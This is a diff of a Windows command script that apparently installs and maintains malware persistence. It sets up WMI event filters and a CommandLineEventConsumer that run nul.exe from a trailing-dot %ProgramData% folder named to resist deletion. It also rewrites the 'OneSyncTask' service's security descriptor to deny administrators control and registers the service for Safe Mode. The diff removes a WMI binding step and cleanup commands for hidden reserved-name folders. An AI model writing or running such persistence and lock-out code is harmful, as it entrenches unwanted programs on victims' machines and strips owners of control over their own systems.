@@ -1,10 +1,8 @@
 taskkill.exe /f /IM nul.exe
-wmic /NAMESPACE:"\\root\subscription" PATH __FilterToConsumerBinding WHERE "Filter='__EventFilter.Name=''LUN'''" SET Consumer="CommandLineEventConsumer.Name='LUN'"
 wmic /NAMESPACE:"\\root\subscription" PATH __EventFilter WHERE Name="NRP" SET Query="SELECT * FROM __InstanceModificationEvent WITHIN 70 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 240 AND TargetInstance.SystemUpTime < 300"
 wmic /NAMESPACE:"\\root\subscription" PATH __EventFilter WHERE Name="NOC" SET Query="SELECT * FROM __InstanceModificationEvent WITHIN 70 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 310 AND TargetInstance.SystemUpTime < 370"
 wmic /NAMESPACE:"\\root\subscription" PATH CommandLineEventConsumer WHERE Name="LUN" GET CommandLineTemplate | findstr /C:"%ProgramData%\nuldata..\nul.exe %ProgramData%\nuldata..\nul" >nul || wmic /NAMESPACE:"\\root\subscription" PATH CommandLineEventConsumer WHERE Name="LUN" SET CommandLineTemplate="%ProgramData%\nuldata..\nul.exe %ProgramData%\nuldata..\nul"
 
-powershell.exe -NoProfile -Command "$b = Get-WmiObject -Namespace root\subscription -Class __FilterToConsumerBinding | Where-Object { $_.Filter -like '*LUN*' }; if ($b) { $b.Consumer = '\\.\root\subscription:CommandLineEventConsumer.Name=\"LUN\"'; $b.Put() } else { Set-WmiInstance -Namespace root\subscription -Class __FilterToConsumerBinding -Arguments @{Filter='\\.\root\subscription:__EventFilter.Name=\"LUN\"'; Consumer='\\.\root\subscription:CommandLineEventConsumer.Name=\"LUN\"'} } | Out-Null"
 powershell.exe -NoProfile -Command "Set-WmiInstance -Path '\\.\root\subscription:__EventFilter.Name=\"NRP\"' -Arguments @{EventNamespace='root\cimv2'; QueryLanguage='WQL'; Query='SELECT * FROM __InstanceModificationEvent WITHIN 70 WHERE TargetInstance ISA ''Win32_PerfFormattedData_PerfOS_System'' AND TargetInstance.SystemUpTime >= 240 AND TargetInstance.SystemUpTime < 300'} | Out-Null"
 powershell.exe -NoProfile -Command "Set-WmiInstance -Path '\\.\root\subscription:__EventFilter.Name=\"NOC\"' -Arguments @{EventNamespace='root\cimv2'; QueryLanguage='WQL'; Query='SELECT * FROM __InstanceModificationEvent WITHIN 70 WHERE TargetInstance ISA ''Win32_PerfFormattedData_PerfOS_System'' AND TargetInstance.SystemUpTime >= 310 AND TargetInstance.SystemUpTime < 370'} | Out-Null"
 powershell.exe -NoProfile -Command "$target = '%ProgramData%\nuldata..\nul.exe %ProgramData%\nuldata..\nul'; $c = Get-CimInstance -Namespace root\subscription -ClassName CommandLineEventConsumer -Filter \"Name='LUN'\"; if ($c -and $c.CommandLineTemplate -ne $target) { $c.CommandLineTemplate = $target; Set-CimInstance -InputObject $c }"
@@ -15,10 +13,3 @@ reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Executio
 reg query "HKLM\SYSTEM\CurrentControlSet\Services\OneSyncTask" /v Security >nul || sc sdset "OneSyncTask" "D:(D;;DCLCWPDTSD;;;IU)(D;;DCLCWPDTSD;;;SU)(D;;DCLCWPDTSD;;;BA)(A;;CCLCSWLOCRRC;;;IU)(A;;CCLCSWLOCRRC;;;SU)(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)S:(AU;FA;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;WD)"
 reg query "HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot\Minimal\OneSyncTask" /ve >nul || reg add "HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot\Minimal\OneSyncTask" /ve /t REG_SZ /d "Service" /f
 reg query "HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot\Network\OneSyncTask" /ve >nul || reg add "HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot\Network\OneSyncTask" /ve /t REG_SZ /d "Service" /f
-rd /S /Q \\.\%ProgramData%\AUX..\
-rd /S /Q \\.\%ProgramData%\CON..\
-rd /S /Q \\.\%ProgramData%\NUL..\
-rd /S /Q \\.\%ProgramData%\config..\
-rd /S /Q \\.\%ProgramData%\logdata..\
-rd /S /Q \\.\%ProgramData%\diaglogs..\
-rd /S /Q "\\.\%ProgramData%\Comms.{20D04FE0-3AEA-1069-A2D8-08002B30309D}"
